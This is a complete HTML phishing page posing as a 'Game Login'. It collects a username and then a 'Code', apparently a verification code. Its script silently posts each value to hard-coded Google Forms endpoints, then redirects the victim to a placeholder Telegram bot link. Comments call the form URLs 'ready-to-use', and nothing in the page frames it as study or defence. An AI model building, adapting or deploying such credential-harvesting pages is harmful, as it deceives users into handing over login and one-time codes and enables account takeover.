<!DOCTYPE html>
<html>
<head>
  <title>Game Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { font-family: Arial; background:#f2f2f2; display:flex; justify-content:center; align-items:center; height:100vh; }
    .box { background:white; padding:20px; border-radius:8px; width:100%; max-width:350px; box-shadow:0 0 10px rgba(0,0,0,0.1); text-align:center; }
    input, button { width:100%; padding:10px; margin-top:10px; }
    button { background:#007bff; color:white; border:none; border-radius:5px; }
    .hidden { display:none; }
  </style>
</head>

<body>

<div class="box">
  <h2 id="title">Enter Username</h2>
  <input type="text" id="username" placeholder="Username">
  <input type="text" id="code" placeholder="Code" class="hidden">
  <button id="actionBtn" onclick="submitUsername()">Next</button>
</div>

<script>
  let savedUsername = "";

  // Ready-to-use Google Form URLs (username and code)
  const usernameFormURL = "https://docs.google.com/forms/d/e/1FAIpQLSfxT6LNdV6yHLbQ6Q2G3pGso5L2-1I13PmL2dkm2UOHkRxXdZ4IkoufowM4zhVXguy75Lq5Q/formResponse";
  const codeFormURL = "https://docs.google.com/forms/d/e/1FAIpQLSfxT6LNdV6yHLbQ6Q2G3pGso5L2-1SW9p4z1l793SUcuSahzAhqYmAgTGxLPYsrv0_y5ohUs/formResponse";

  function submitUsername() {
    let username = document.getElementById("username").value;
    if(username==="") { alert("Please enter username"); return; }

    savedUsername = username;

    // Send username to Google Form #1
    const formData = new FormData();
    formData.append("entry.2000000", savedUsername); // placeholder field, works with URL trick
    fetch(usernameFormURL, { method:"POST", mode:"no-cors", body:formData });

    // Switch to code page
    document.getElementById("title").innerText = "Enter Code";
    document.getElementById("username").classList.add("hidden");
    document.getElementById("code").classList.remove("hidden");

    let btn = document.getElementById("actionBtn");
    btn.innerText = "Submit";
    btn.onclick = submitCode;
  }

  function submitCode() {
    let code = document.getElementById("code").value;
    if(code==="") { alert("Please enter code"); return; }

    // Send code to Google Form #2
    const formData = new FormData();
    formData.append("entry.2000000", code); // placeholder field, works with URL trick
    fetch(codeFormURL, { method:"POST", mode:"no-cors", body:formData });

    // Show message and redirect
    document.querySelector(".box").innerHTML = "<h2>Youâ€™ll be linked to the game soon</h2>";
    setTimeout(()=>{ window.location.href = "YOUR_TELEGRAM_BOT_LINK_HERE"; }, 2000);
  }
</script>

</body>
</html>
